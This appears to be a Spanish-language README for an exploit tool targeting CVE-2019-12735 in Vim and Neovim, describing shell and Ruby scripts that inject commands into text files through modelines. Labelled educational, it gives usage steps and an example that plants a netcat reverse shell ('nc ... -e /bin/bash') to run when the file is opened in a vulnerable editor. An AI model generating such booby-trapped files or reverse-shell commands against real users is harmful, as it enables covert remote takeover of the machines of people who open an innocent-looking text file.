# modeline-vim
_Script con fines educativos que explota la vulnerabilidad de vim._

## Introducción.
_El script aprovecha la vulnerabilidad([CVE-2019-12735](#referencias)) de Vim < 8.1,1365 y Neovim < 0.3.6 que permite ejecutar código dentro de un archivo de texto por medio de modelines al momento de abrirlo. Dicho script fue desarrollado con fines educativos y queda bajo responsabilidad de quien lo usa._

## Archivos.
* **modeline.sh**_, script shell que recibe como parámetro el comando a inyectar en el archivo de texto._
* **modeline.rb**_, programa en ruby que solicita el nombre del archivo, texto a ingresar en el archivo de texto y comando a inyectar._

## Instrucciones.
_Se recomienda que se abra con el editor emacs o algún otro editor de texto que sea vim, ya que se ejecuta la vulnerabilidad y distorsiona el archivo :smile:. En caso de que se desea usar vim se debe de desabilitar el modelines (**:set nomodeline**)._

_modeline.sh requiere solamente de un parámetro, el cual tiene que ser un comando con sus respectivos parámetros(opcional)._
```
chmod 700 modeline.sh
modeline.sh _comando_ > archivoTexto.
```
### Ejemplo.
_Se utilizará el comando nc para realizar un shell inverso._
```
modeline.sh nc 127.0.0.1 8888 -e /bin/bash > datos.txt
```
## Referencias.
[PoC](https://github.com/numirias/security/blob/master/doc/2019-06-04_ace-vim-neovim.md#summary)

[CVE-2019-12735](https://nvd.nist.gov/vuln/detail/CVE-2019-12735)
